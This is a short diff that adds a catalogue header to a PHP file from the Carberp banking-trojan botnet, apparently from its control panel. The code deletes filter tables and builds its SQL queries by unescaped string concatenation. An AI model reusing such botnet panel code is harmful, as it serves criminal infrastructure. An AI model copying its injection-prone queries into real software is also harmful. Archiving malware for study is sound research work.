@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 $smarty->assign('rand_name', mt_rand(0000000000, 9999999999));
 $parent = $mysqli->query('SELECT * from bf_filters WHERE id = '.$Cur['id'].' LIMIT 1');
@@ -7,7 +18,8 @@ if(!empty($parent->id)){
 		if(isset($_POST['yes'])){
 			$subs = $mysqli->query('SELECT * FROM bf_filters WHERE !ISNULL(host) AND (parent_id LIKE \''.$parent->id.'|%\')');
 
-			foreach($subs as $item){				$mysqli->query('drop table if exists bf_filter_' . $item->id);
+			foreach($subs as $item){
+				$mysqli->query('drop table if exists bf_filter_' . $item->id);
 			}
 
 			if($parent->parent_id == 0){
